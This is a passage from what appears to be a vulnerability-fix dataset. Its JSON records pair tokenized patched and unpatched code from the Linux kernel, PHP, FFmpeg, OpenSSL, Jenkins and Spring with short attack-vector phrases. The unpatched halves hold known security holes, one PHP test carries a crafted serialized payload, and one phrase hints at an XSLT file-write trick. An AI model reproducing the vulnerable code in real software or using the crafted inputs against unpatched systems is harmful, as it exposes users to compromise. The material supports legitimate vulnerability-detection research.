"ZEND_PARSE_PARAMS_QUIET", ",", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "l", "\"", ",", "&", "securityPrefs", ")", "=", "=", "SUCCESS", ")", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "oldSecurityPrefs", "=", "intern", "-", ">", "securityPrefs", ";", "intern", "-", ">", "securityPrefs", "=", "securityPrefs", ";", "RETURN_LONG", "(", "oldSecurityPrefs", ")", ";", "}", "else", "{", "WRONG_PARAM_COUNT", ";", "}", "}", "/", "*", "}", "}}", "end", "xsl_xsltprocessor_set_security_prefs", "*", "/", "/", "*", "{", "{{", "proto", "long", "xsl_xsltprocessor_get_security_prefs", "(", ")", "*", "/", "PHP_FUNCTION", "(", "xsl_xsltprocessor_get_security_prefs", ")", "{", "zval", "*", "id", ";", "xsl_object", "*", "intern", ";", "DOM_GET_THIS", "(", "id", ")", ";", "long", "securityPrefs", ";", "if", "(", "zend_parse_parameters_ex", "(", "ZEND_PARSE_PARAMS_QUIET", ",", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "\"", "\")", "=", "=", "SUCCESS", ")", "{", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "RETURN_LONG", "(", "intern", "-", ">", "securityPrefs", ")", ";", "}", "else", "{", "WRONG_PARAM_COUNT", ";", "}", "}", "/", "*", "}", "}}", "end", "xsl_xsltprocessor_get_security_prefs", "*", "/</s>-", "Improved", "ZLIB", "extension", ":", "-", "All", "SimpleXMLElement", "children", "are", "now", "always", "printed", "when", "using", "var_dump", "(", "),"], "docstring_tokens": ["uses", "something", "like", "\"<sax:output", "href=\"0wn3d.php"]}
{"contents": ["empty"], "code_tokens": ["struct", "frag_hdr", "fhdr", ";", "}", "else", "if", "(", "skb_is_gso", "(", "skb", ")", ")", "{", "goto", "append", ";", "skb", "-", ">", "ip_summed", "=", "CHECKSUM_PARTIAL", ";", "/", "*", "Specify", "the", "length", "of", "each", "IPv6", "datagram", "fragment", ".", "*", "It", "has", "to", "be", "a", "multiple", "of", "8", ".", "*", "/", "skb_shinfo", "(", "skb", ")", "->", "gso_size", "=", "(", "mtu", "-", "fragheaderlen", "-", "sizeof", "(", "struct", "frag_hdr", ")", ")", "&", "~", "7", ";", "skb_shinfo", "(", "skb", ")", "->", "gso_type", "=", "SKB_GSO_UDP", ";", "ipv6_select_ident", "(", "&", "fhdr", ",", "rt", ")", ";", "skb_shinfo", "(", "skb", ")", "->", "ip6_frag_id", "=", "fhdr", ".", "identification", ";", "append", ":</s>struct", "frag_hdr", "fhdr", ";", "skb", "-", ">", "ip_summed", "=", "CHECKSUM_PARTIAL", ";", "/", "*", "Specify", "the", "length", "of", "each", "IPv6", "datagram", "fragment", ".", "*", "It", "has", "to", "be", "a", "multiple", "of", "8", ".", "*", "/", "skb_shinfo", "(", "skb", ")", "->", "gso_size", "=", "(", "mtu", "-", "fragheaderlen", "sizeof", "(", "struct", "frag_hdr", ")", ")", "&", "~", "7", ";", "skb_shinfo", "(", "skb", ")", "->", "gso_type", "=", "SKB_GSO_UDP", ";", "ipv6_select_ident", "(", "&", "fhdr", ",", "rt", ")", ";", "skb_shinfo", "(", "skb", ")", "->", "ip6_frag_id", "=", "fhdr", ".", "identification", ";"], "docstring_tokens": ["sending", "overly", "large", "messages"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "Used", "in", "tunnel", "GRO", "receive", "*", "/", "u8", "encap_mark", ":", "1", ";", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "=", "0", ";", "static", "struct", "sk_buff", "*", "*", "ipip_gro_receive", "(", "struct", "sk_buff", "*", "*", "head", ",", "struct", "sk_buff", "*", "skb", ")", "{", "if", "(", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", ")", "{", "NAPI_GRO_CB", "(", "skb", ")", "->", "flush", "=", "1", ";", "return", "NULL", ";", "}", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "=", "1", ";", "return", "inet_gro_receive", "(", "head", ",", "skb", ")", ";", "}", ".", "gro_receive", "=", "ipip_gro_receive", ",", "if", "(", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", ")", "goto", "out", ";", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "=", "1", ";", "if", "(", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "|", "|", "/", "*", "mark", "that", "this", "skb", "passed", "once", "through", "the", "tunnel", "gro", "layer", "*", "/", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "=", "1", ";", "static", "struct", "sk_buff", "*", "*", "sit_gro_receive", "(", "struct", "sk_buff", "*", "*", "head", ",", "struct", "sk_buff", "*", "skb", ")", "{", "if", "(", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", ")", "{", "NAPI_GRO_CB", "(", "skb", ")", "->", "flush", "=", "1", ";", "return", "NULL", ";", "}", "NAPI_GRO_CB", "(", "skb", ")", "->", "encap_mark", "=", "1", ";", "return", "ipv6_gro_receive", "(", "head", ",", "skb", ")", ";", "}", ".", "gro_receive", "=", "sit_gro_receive", ",</s>/", "*", "Used", "in", "udp_gro_receive", "*", "/", "u8", "udp_mark", ":", "1", ";", "NAPI_GRO_CB", "(", "skb", ")", "->", "udp_mark", "=", "0", ";", ".", "gro_receive", "=", "inet_gro_receive", ",", "if", "(", "NAPI_GRO_CB", "(", "skb", ")", "->", "udp_mark", "|", "|", "/", "*", "mark", "that", "this", "skb", "passed", "once", "through", "the", "udp", "gro", "layer", "*", "/", "NAPI_GRO_CB", "(", "skb", ")", "->", "udp_mark", "=", "1", ";", ".", "gro_receive", "=", "ipv6_gro_receive", ","], "docstring_tokens": ["sending", "specially-crafted", "packets"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "assoc_array_ptr_is_leaf", "(", "ptr", ")", "&", "&", "ops", "-", ">", "compare_object", "(", "assoc_array_ptr_to_leaf", "(", "ptr", ")", ",", "index_key", ")", ")", "{</s>if", "(", "ops", "-", ">", "compare_object", "(", "assoc_array_ptr_to_leaf", "(", "ptr", ")", ",", "index_key", ")", ")", "{"], "docstring_tokens": ["via", "an", "application", "that", "uses", "associative-array", "data", "structures"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "Invalid", "length", "of", "ER", "tag", "id", "?", "*", "/", "if", "(", "rr", "-", ">", "u", ".", "ER", ".", "len_id", "+", "offsetof", "(", "struct", "rock_ridge", ",", "u", ".", "ER", ".", "data", ")", ">", "rr", "-", ">", "len", ")", "goto", "out", ";</s>"], "docstring_tokens": ["via", "a", "crafted", "iso9660", "image", "."]}
{"contents": ["empty"], "code_tokens": ["import", "hudson", ".", "Util", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpSession", ";", "public", "HttpResponse", "doCommenceLogin", "(", "final", "StaplerRequest", "request", ",", "final", "StaplerResponse", "response", ",", "@", "QueryParameter", "String", "from", ",", "@", "Header", "(", "\"", "Referer", "\"", ")", "final", "String", "referer", ")", "{", "String", "redirectOnFinish", "=", "calculateSafeRedirect", "(", "from", ",", "referer", ")", ";", "request", ".", "getSession", "(", ").", "setAttribute", "(", "REFERER_ATTRIBUTE", ",", "redirectOnFinish", ")", ";", "/", "**", "*", "Check", "parameters", "\"", "from", "\"", "and", "\"", "referer", "\"", "to", "decide", "where", "is", "the", "safe", "URL", "to", "be", "redirected", ".", "*", "@", "param", "from", "http", "request", "\"", "from", "\"", "parameter", ".", "*", "@", "param", "referer", "referer", "header", ".", "*", "@", "return", "a", "safe", "URL", "to", "be", "redirected", ".", "*", "/", "private", "String", "calculateSafeRedirect", "(", "String", "from", ",", "String", "referer", ")", "{", "String", "redirectURL", ";", "String", "rootUrl", "=", "Jenkins", ".", "getInstance", "(", ").", "getRootUrl", "(", ");", "if", "(", "from", "!", "=", "null", "&", "&", "Util", ".", "isSafeToRedirectTo", "(", "from", ")", ")", "{", "redirectURL", "=", "from", ";", "}", "else", "{", "if", "(", "referer", "!", "=", "null", "&", "&", "(", "referer", ".", "startsWith", "(", "rootUrl", ")", "|", "|", "Util", ".", "isSafeToRedirectTo", "(", "referer", ")", "))", "{", "redirectURL", "=", "referer", ";", "}", "else", "{", "redirectURL", "=", "rootUrl", ";", "}", "}", "LOG", ".", "fine", "(", "\"", "Safe", "URL", "redirection", ":", "\"", "+", "redirectURL", ")", ";", "return", "redirectURL", ";", "}", "String", "referer", "=", "(", "String", ")", "request", ".", "getSession", "(", ").", "getAttribute", "(", "REFERER_ATTRIBUTE", ")", ";", "/", "/", "redirect", "back", "to", "original", "page", "String", "redirectUrl", "=", "referer", "!", "=", "null", "?", "referer", ":", "baseUrl", "(", ");", "recreateSession", "(", "request", ")", ";", "/", "**", "*", "check", "if", "a", "request", "contains", "a", "session", ",", "if", "so", ",", "it", "invalidate", "the", "session", "and", "create", "new", "one", "to", "avoid", "session", "*", "fixation", ".", "*", "@", "param", "request", "request", ".", "*", "/", "private", "void", "recreateSession", "(", "StaplerRequest", "request", ")", "{", "HttpSession", "session", "=", "request", ".", "getSession", "(", "false", ")", ";", "if", "(", "session", "!", "=", "null", ")", "{", "LOG", ".", "finest", "(", "\"", "Invalidate", "previous", "session", "\"", ");", "/", "/", "avoid", "session", "fixation", "session", ".", "invalidate", "(", ");", "}", "request", ".", "getSession", "(", "true", ")", ";", "}</s>public", "HttpResponse", "doCommenceLogin", "(", "final", "StaplerRequest", "request", ",", "final", "StaplerResponse", "response", ",", "@", "Header", "(", "\"", "Referer", "\"", ")", "final", "String", "referer", ")", "{", "request", ".", "getSession", "(", ").", "setAttribute", "(", "REFERER_ATTRIBUTE", ",", "referer", ")", ";", "/", "/", "redirect", "back", "to", "original", "page", "String", "referer", "=", "(", "String", ")", "request", ".", "getSession", "(", ").", "getAttribute", "(", "REFERER_ATTRIBUTE", ")", ";", "String", "redirectUrl", "=", "referer", "!", "=", "null", "?", "referer", ":", "baseUrl", "(", ");"], "docstring_tokens": ["creating", "an", "SSH", "credential", "referencing", "an", "arbitrary", "file", "on", "the", "Jenkins", "master"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "The", "controllers", "I", "'", "ve", "tested", "have", "not", "worked", "correctly", "when", "*", "second_req_count", "is", "zero", ".", "Rather", "than", "do", "something", "we", "know", "won", "'", "t", "*", "work", ",", "return", "an", "error", "*", "/", "if", "(", "rest", "=", "=", "0", ")", "return", "-", "EINVAL", ";", "struct", "descriptor", "*", "d", ",", "*", "pd", ";", "pd", "=", "d", ";", "pd", "+", "+;</s>struct", "descriptor", "*", "d", "=", "NULL", ",", "*", "pd", "=", "NULL", ";", "pd", "=", "d", "+", "j", ";"], "docstring_tokens": ["sending", "specially-crafted", "packets", "with", "a", "data", "length", "of", "zero"]}
{"contents": ["empty"], "code_tokens": ["memset", "(", "sax", ",", "0", ",", "sizeof", "(", "*", "sax", ")", ");</s>memset", "(", "sax", ",", "0", ",", "sizeof", "(", "sax", ")", ");"], "docstring_tokens": ["using", "recvmsg(2)/recvfrom(2)"]}
{"contents": ["empty"], "code_tokens": ["unsigned", "short", "sel", ";", "struct", "desc_struct", "new_desc", ";", "/", "*", "Error", "handling", "is", "not", "implemented", ".", "*", "/", "if", "(", "rc", "!", "=", "X86EMUL_CONTINUE", ")", "return", "X86EMUL_UNHANDLEABLE", ";", "struct", "desc_struct", "new_desc", ";", "/", "*", "Error", "handling", "is", "not", "implemented", ".", "*", "/", "if", "(", "rc", "!", "=", "X86EMUL_CONTINUE", ")", "return", "X86EMUL_UNHANDLEABLE", ";</s>unsigned", "short", "sel", ",", "old_sel", ";", "struct", "desc_struct", "old_desc", ",", "new_desc", ";", "const", "struct", "x86_emulate_ops", "*", "ops", "=", "ctxt", "-", ">", "ops", ";", "/", "*", "Assignment", "of", "RIP", "may", "only", "fail", "in", "64", "-", "bit", "mode", "*", "/", "if", "(", "ctxt", "-", ">", "mode", "=", "=", "X86EMUL_MODE_PROT64", ")", "ops", "-", ">", "get_segment", "(", "ctxt", ",", "&", "old_sel", ",", "&", "old_desc", ",", "NULL", ",", "VCPU_SREG_CS", ")", ";", "if", "(", "rc", "!", "=", "X86EMUL_CONTINUE", ")", "{", "WARN_ON", "(", "ctxt", "-", ">", "mode", "!", "=", "X86EMUL_MODE_PROT64", ")", ";", "/", "*", "assigning", "eip", "failed", ";", "restore", "the", "old", "cs", "*", "/", "ops", "-", ">", "set_segment", "(", "ctxt", ",", "old_sel", ",", "&", "old_desc", ",", "0", ",", "VCPU_SREG_CS", ")", ";", "return", "rc", ";", "}", "u16", "old_cs", ";", "struct", "desc_struct", "old_desc", ",", "new_desc", ";", "const", "struct", "x86_emulate_ops", "*", "ops", "=", "ctxt", "-", ">", "ops", ";", "if", "(", "ctxt", "-", ">", "mode", "=", "=", "X86EMUL_MODE_PROT64", ")", "ops", "-", ">", "get_segment", "(", "ctxt", ",", "&", "old_cs", ",", "&", "old_desc", ",", "NULL", ",", "VCPU_SREG_CS", ")", ";", "if", "(", "rc", "!", "=", "X86EMUL_CONTINUE", ")", "{", "WARN_ON", "(", "ctxt", "-", ">", "mode", "!", "=", "X86EMUL_MODE_PROT64", ")", ";", "ops", "-", ">", "set_segment", "(", "ctxt", ",", "old_cs", ",", "&", "old_desc", ",", "0", ",", "VCPU_SREG_CS", ")", ";", "}"], "docstring_tokens": ["using", "a", "specially-crafted", "application"]}
{"contents": ["empty"], "code_tokens": ["for", "(", "i", "=", "0", ";", "i", "<", "table_entries_used", ";", "i", "+", "+)", "{", "if", "(", "avio_feof", "(", "pb", ")", ")", "return", "AVERROR_INVALIDDATA", ";", "}</s>for", "(", "i", "=", "0", ";", "i", "<", "table_entries_used", ";", "i", "+", "+)"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially", "crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "offset", "|", "|", "!", "ht", ")", "{", "case", "IS_STRING", ":", "case", "IS_BOOL", ":", "if", "(", "!", "php_var_unserialize", "(", "&", "intern", "-", ">", "array", ",", "&", "p", ",", "s", "+", "buf_len", ",", "&", "var_hash", "TSRMLS_CC", ")", "|", "|", "(", "Z_TYPE_P", "(", "intern", "-", ">", "array", ")", "!", "=", "IS_ARRAY", "&", "&", "Z_TYPE_P", "(", "intern", "-", ">", "array", ")", "!", "=", "IS_OBJECT", ")", ")", "{", "zval_ptr_dtor", "(", "&", "intern", "-", ">", "array", ")", ";", "-", "-", "TEST", "-", "-", "Bug", "#", "73029", ":", "Missing", "type", "check", "when", "unserializing", "SplArray", "-", "-", "FILE", "-", "-", "<", "?", "php", "try", "{", "$", "a", "=", "'", "C", ":", "11", ":", "\"", "ArrayObject", "\"", ":", "19", ":", "0x", ":", "i", ":", "0", ";", "r", ":", "2", ";", ";", "m", ":", "a", ":", "0", ":", "{}", "}'", ";", "$", "m", "=", "unserialize", "(", "$", "a", ")", ";", "$", "x", "=", "$", "m", "[", "2", "]", ";", "}", "catch", "(", "UnexpectedValueException", "$", "e", ")", "{", "print", "$", "e", "-", ">", "getMessage", "(", ")", ".", "\"", "\\", "n", "\"", ";", "}", "?", ">", "DONE", "-", "-", "EXPECTF", "-", "-", "Error", "at", "offset", "10", "of", "19", "bytes", "DONE</s>if", "(", "!", "offset", ")", "{", "case", "IS_STRING", ":", "case", "IS_BOOL", ":", "if", "(", "!", "php_var_unserialize", "(", "&", "intern", "-", ">", "array", ",", "&", "p", ",", "s", "+", "buf_len", ",", "&", "var_hash", "TSRMLS_CC", ")", ")", "{"], "docstring_tokens": ["via", "crafted", "serialized", "data", "."]}
{"contents": ["empty"], "code_tokens": ["mount", "-", "max", ":", "This", "denotes", "the", "maximum", "number", "of", "mounts", "that", "may", "exist", "in", "a", "mount", "namespace", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "unsigned", "int", "mounts", ";", "/", "*", "#", "of", "mounts", "in", "the", "namespace", "*", "/", "unsigned", "int", "pending_mounts", ";", "/", "*", "Maximum", "number", "of", "mounts", "in", "a", "mount", "namespace", "*", "/", "unsigned", "int", "sysctl_mount_max", "__read_mostly", "=", "100000", ";", "n", "-", ">", "mounts", "+", "=", "n", "-", ">", "pending_mounts", ";", "n", "-", ">", "pending_mounts", "=", "0", ";", "struct", "mnt_namespace", "*", "ns", ";", "ns", "=", "p", "-", ">", "mnt_ns", ";", "if", "(", "ns", ")", "{", "ns", "-", ">", "mounts", "-", "-;", "__touch_mnt_namespace", "(", "ns", ")", ";", "}", "int", "count_mounts", "(", "struct", "mnt_namespace", "*", "ns", ",", "struct", "mount", "*", "mnt", ")", "{", "unsigned", "int", "max", "=", "READ_ONCE", "(", "sysctl_mount_max", ")", ";", "unsigned", "int", "mounts", "=", "0", ",", "old", ",", "pending", ",", "sum", ";", "struct", "mount", "*", "p", ";", "for", "(", "p", "=", "mnt", ";", "p", ";", "p", "=", "next_mnt", "(", "p", ",", "mnt", ")", ")", "mounts", "+", "+;", "old", "=", "ns", "-", ">", "mounts", ";", "pending", "=", "ns", "-", ">", "pending_mounts", ";", "sum", "=", "old", "+", "pending", ";", "if", "(", "(", "old", ">", "sum", ")", "|", "|", "(", "pending", ">", "sum", ")", "|", "|", "(", "max", "<", "sum", ")", "|", "|", "(", "mounts", ">", "(", "max", "-", "sum", ")", "))", "return", "-", "ENOSPC", ";", "ns", "-", ">", "pending_mounts", "=", "pending", "+", "mounts", ";", "return", "0", ";", "}", "struct", "mnt_namespace", "*", "ns", "=", "dest_mnt", "-", ">", "mnt_ns", ";", "/", "*", "Is", "there", "space", "to", "add", "these", "mounts", "to", "the", "mount", "namespace", "?", "*", "/", "if", "(", "!", "parent_path", ")", "{", "err", "=", "count_mounts", "(", "ns", ",", "source_mnt", ")", ";", "if", "(", "err", ")", "goto", "out", ";", "}", "child", "-", ">", "mnt_parent", "-", ">", "mnt_ns", "-", ">", "pending_mounts", "=", "0", ";", "ns", "-", ">", "pending_mounts", "=", "0", ";", "new_ns", "-", ">", "mounts", "=", "0", ";", "new_ns", "-", ">", "pending_mounts", "=", "0", ";", "new_ns", "-", ">", "mounts", "+", "+;", "new_ns", "-", ">", "mounts", "+", "+;", "return", "count_mounts", "(", "m", "-", ">", "mnt_ns", ",", "child", ")", ";", "int", "count_mounts", "(", "struct", "mnt_namespace", "*", "ns", ",", "struct", "mount", "*", "mnt", ")", ";", "extern", "unsigned", "int", "sysctl_mount_max", ";", "#", "include", "<", "linux", "/", "mount", ".", "h", ">", "{", ".", "procname", "=", "\"", "mount", "-", "max", "\"", ",", ".", "data", "=", "&", "sysctl_mount_max", ",", ".", "maxlen", "=", "sizeof", "(", "unsigned", "int", ")", ",", ".", "mode", "=", "0644", ",", ".", "proc_handler", "=", "proc_dointvec_minmax", ",", ".", "extra1", "=", "&", "one", ",", "}", ",</s>-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "@", "@", "-", "14", ",", "6", "+", "14", ",", "8", "@", "@", "struct", "mnt_namespace", "{", "__touch_mnt_namespace", "(", "p", "-", ">", "mnt_ns", ")", ";", "return", "0", ";"], "docstring_tokens": ["overflowing", "kernel", "mount", "table", "using", "shared", "bind", "mount"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "Has", "the", "CAN", "frame", "been", "modified", "?", "*", "/", "/", "*", "get", "available", "space", "for", "the", "processed", "CAN", "frame", "type", "*", "/", "int", "max_len", "=", "nskb", "-", ">", "len", "-", "offsetof", "(", "struct", "can_frame", ",", "data", ")", ";", "/", "*", "dlc", "may", "have", "changed", ",", "make", "sure", "it", "fits", "to", "the", "CAN", "frame", "*", "/", "if", "(", "cf", "-", ">", "can_dlc", ">", "max_len", ")", "goto", "out_delete", ";", "/", "*", "check", "for", "checksum", "updates", "in", "classic", "CAN", "length", "only", "*", "/", "if", "(", "gwj", "-", ">", "mod", ".", "csumfunc", ".", "crc8", ")", "{", "if", "(", "cf", "-", ">", "can_dlc", ">", "8", ")", "goto", "out_delete", ";", "}", "if", "(", "gwj", "-", ">", "mod", ".", "csumfunc", ".", "xor", ")", "{", "if", "(", "cf", "-", ">", "can_dlc", ">", "8", ")", "goto", "out_delete", ";", "}", "return", ";", "out_delete", ":", "/", "*", "delete", "frame", "due", "to", "misconfiguration", "*", "/", "gwj", "-", ">", "deleted_frames", "+", "+;", "kfree_skb", "(", "nskb", ")", ";", "return", ";</s>/", "*", "check", "for", "checksum", "updates", "when", "the", "CAN", "frame", "has", "been", "modified", "*", "/", "if", "(", "gwj", "-", ">", "mod", ".", "csumfunc", ".", "crc8", ")", "if", "(", "gwj", "-", ">", "mod", ".", "csumfunc", ".", "xor", ")"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["return", "cdc_ncm_bind_common", "(", "dev", ",", "intf", ",", "CDC_NCM_DATA_ALTSETTING_NCM", ",", "0", ")", ";", ".", "flags", "=", "FLAG_POINTTOPOINT", "|", "FLAG_NO_SETINT", "|", "FLAG_MULTI_PACKET", "|", "FLAG_LINK_INTR", ",", "|", "FLAG_LINK_INTR", "|", "FLAG_WWAN", ",", "|", "FLAG_LINK_INTR", "|", "FLAG_WWAN", "|", "FLAG_NOARP", ",</s>int", "ret", ";", "ret", "=", "cdc_ncm_bind_common", "(", "dev", ",", "intf", ",", "CDC_NCM_DATA_ALTSETTING_NCM", ",", "0", ")", ";", "/", "*", "*", "We", "should", "get", "an", "event", "when", "network", "connection", "is", "\"", "connected", "\"", "or", "*", "\"", "disconnected", "\"", ".", "Set", "network", "connection", "in", "\"", "disconnected", "\"", "state", "*", "(", "carrier", "is", "OFF", ")", "during", "attach", ",", "so", "the", "IP", "network", "stack", "does", "not", "*", "start", "IPv6", "negotiation", "and", "more", ".", "*", "/", "usbnet_link_change", "(", "dev", ",", "0", ",", "0", ")", ";", "return", "ret", ";", ".", "flags", "=", "FLAG_POINTTOPOINT", "|", "FLAG_NO_SETINT", "|", "FLAG_MULTI_PACKET", ",", "|", "FLAG_WWAN", ",", "|", "FLAG_WWAN", "|", "FLAG_NOARP", ","], "docstring_tokens": ["inserting", "a", "USB", "device", "with", "an", "invalid", "USB", "descriptor"]}
{"contents": ["empty"], "code_tokens": ["/", "*", "*", "To", "send", "multiple", "CAN", "frame", "content", "within", "TX_SETUP", "or", "to", "filter", "*", "CAN", "messages", "with", "multiplex", "index", "within", "RX_SETUP", ",", "the", "number", "of", "*", "different", "filters", "is", "limited", "to", "256", "due", "to", "the", "one", "byte", "index", "value", ".", "*", "/", "#", "define", "MAX_NFRAMES", "256", "u32", "flags", ";", "u32", "count", ";", "u32", "nframes", ";", "u32", "currframe", ";", "seq_printf", "(", "m", ",", "\"", "[%", "u", "]", "%", "c", "\"", ",", "op", "-", ">", "nframes", ",", "seq_printf", "(", "m", ",", "\"", "tx_op", ":", "%", "03X", "%", "s", "[", "%", "u", "]", "\"", ",", "unsigned", "int", "datalen", "=", "head", "-", ">", "nframes", "*", "CFSIZ", ";", "static", "void", "bcm_rx_cmp_to_index", "(", "struct", "bcm_op", "*", "op", ",", "unsigned", "int", "index", ",", "static", "inline", "int", "bcm_rx_do_flush", "(", "struct", "bcm_op", "*", "op", ",", "int", "update", ",", "unsigned", "int", "index", ")", "unsigned", "int", "i", ";", "unsigned", "int", "i", ";", "unsigned", "int", "i", ";", "int", "err", ";", "/", "*", "check", "nframes", "boundaries", "-", "we", "need", "at", "least", "one", "can_frame", "*", "/", "if", "(", "msg_head", "-", ">", "nframes", "<", "1", "|", "|", "msg_head", "-", ">", "nframes", ">", "MAX_NFRAMES", ")", "/", "*", "the", "first", "element", "contains", "the", "mux", "-", "mask", "=", ">", "MAX_NFRAMES", "+", "1", "*", "/", "if", "(", "msg_head", "-", ">", "nframes", ">", "MAX_NFRAMES", "+", "1", ")", "return", "-", "EINVAL", ";</s>int", "flags", ";", "int", "count", ";", "int", "nframes", ";", "int", "currframe", ";", "seq_printf", "(", "m", ",", "\"", "[%", "d", "]", "%", "c", "\"", ",", "op", "-", ">", "nframes", ",", "seq_printf", "(", "m", ",", "\"", "tx_op", ":", "%", "03X", "%", "s", "[", "%", "d", "]", "\"", ",", "int", "datalen", "=", "head", "-", ">", "nframes", "*", "CFSIZ", ";", "static", "void", "bcm_rx_cmp_to_index", "(", "struct", "bcm_op", "*", "op", ",", "int", "index", ",", "static", "inline", "int", "bcm_rx_do_flush", "(", "struct", "bcm_op", "*", "op", ",", "int", "update", ",", "int", "index", ")", "int", "i", ";", "int", "i", ";", "int", "i", ",", "err", ";", "/", "*", "we", "need", "at", "least", "one", "can_frame", "*", "/", "if", "(", "msg_head", "-", ">", "nframes", "<", "1", ")"], "docstring_tokens": ["setting", "up", "a", "truncated", "memory", "mapping", "as", "the", "source", "for", "the", "memcpy_fromiovec", "operation"]}
{"contents": ["empty"], "code_tokens": ["const", "SSL_METHOD", "*", "new_method", ";", "new_method", "=", "ssl23_get_server_method", "(", "s", "-", ">", "version", ")", ";", "if", "(", "new_method", "=", "=", "NULL", ")", "s", "-", ">", "method", "=", "new_method", ";</s>s", "-", ">", "method", "=", "ssl23_get_server_method", "(", "s", "-", ">", "version", ")", ";", "if", "(", "s", "-", ">", "method", "=", "=", "NULL", ")"], "docstring_tokens": ["using", "an", "unexpected", "handshake"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "getStopAfterFirstSuccess", "(", ")", "&", "&", "aggregate", "!", "=", "null", "&", "&", "!", "isEmpty", "(", "aggregate", ".", "getPrincipals", "(", "))", ")", "{", "@", "Test", "public", "void", "testBeforeAttemptEmptyPrincipal", "(", ")", "{", "AuthenticationInfo", "aggregate", "=", "new", "SimpleAuthenticationInfo", "(", ");", "assertEquals", "(", "strategy", ".", "beforeAttempt", "(", "null", ",", "null", ",", "aggregate", ")", ",", "aggregate", ")", ";", "}", "@", "Test", "public", "void", "testBeforeAttemptEmptyList", "(", ")", "{", "SimplePrincipalCollection", "principalCollection", "=", "new", "SimplePrincipalCollection", "(", ");", "AuthenticationInfo", "aggregate", "=", "new", "SimpleAuthenticationInfo", "(", "principalCollection", ",", "null", ")", ";", "assertEquals", "(", "strategy", ".", "beforeAttempt", "(", "null", ",", "null", ",", "aggregate", ")", ",", "aggregate", ")", ";", "}", "AuthenticationInfo", "aggregate", "=", "new", "SimpleAuthenticationInfo", "(", "\"", "principal", "\"", ",", "null", ",", "\"", "a", "-", "realm", "-", "name", "\"", ");</s>if", "(", "getStopAfterFirstSuccess", "(", ")", "&", "&", "aggregate", "!", "=", "null", "&", "&", "isEmpty", "(", "aggregate", ".", "getPrincipals", "(", "))", ")", "{", "AuthenticationInfo", "aggregate", "=", "new", "SimpleAuthenticationInfo", "(", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["l", "=", "strlen", "(", "table", "-", ">", "data", ")", "+", "1", ";</s>l", "=", "strlen", "(", "table", "-", ">", "data", ")", ";", "if", "(", "put_user", "(", "0", ",", "(", "(", "char", "__user", "*", ")", "oldval", ")", "+", "len", ")", ")", "return", "-", "EFAULT", ";"], "docstring_tokens": ["which", "causes", "sysctl", "to", "write", "a", "zero", "byte", "outside", "the", "buffer", "."]}
{"contents": ["empty"], "code_tokens": ["*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "/", "**", "Maximum", "ranges", "per", "request", ".", "*", "/", "private", "static", "final", "int", "MAX_RANGES", "=", "100", ";", "long", "contentLength", "=", "getLengthFor", "(", "resource", ")", ";", "long", "start", "=", "getRangeStart", "(", "contentLength", ")", ";", "long", "end", "=", "getRangeEnd", "(", "contentLength", ")", ";", "return", "new", "ResourceRegion", "(", "resource", ",", "start", ",", "end", "-", "start", "+", "1", ")", ";", "}", "private", "static", "long", "getLengthFor", "(", "Resource", "resource", ")", "{", "long", "contentLength", ";", "contentLength", "=", "resource", ".", "contentLength", "(", ");", "throw", "new", "IllegalArgumentException", "(", "\"", "Failed", "to", "obtain", "Resource", "content", "length", "\"", ",", "ex", ")", ";", "return", "contentLength", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "string", "cannot", "be", "parsed", ",", "or", "if", "*", "the", "number", "of", "ranges", "is", "greater", "than", "100", ".", "Assert", ".", "isTrue", "(", "tokens", ".", "length", "<", "=", "MAX_RANGES", ",", "(", ")", "-", ">", "\"", "Too", "many", "ranges", "\"", "+", "tokens", ".", "length", ")", ";", "*", "@", "throws", "IllegalArgumentException", "if", "the", "sum", "of", "all", "ranges", "exceeds", "the", "*", "resource", "length", ".", "if", "(", "ranges", ".", "size", "(", ")", ">", "1", ")", "{", "long", "length", "=", "getLengthFor", "(", "resource", ")", ";", "long", "total", "=", "regions", ".", "stream", "(", ").", "map", "(", "ResourceRegion", ":", ":", "getCount", ")", ".", "reduce", "(", "0L", ",", "(", "count", ",", "sum", ")", "-", ">", "sum", "+", "count", ")", ";", "Assert", ".", "isTrue", "(", "total", "<", "length", ",", "(", ")", "-", ">", "\"", "The", "sum", "of", "all", "ranges", "(", "\"", "+", "total", "+", "\"", ")", "\"", "\"", "should", "be", "less", "than", "the", "resource", "length", "(", "\"", "+", "length", "+", "\"", ")\"", ");", "}", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "stream", ".", "Stream", ";", "@", "Test", "public", "void", "parseRangesValidations", "(", ")", 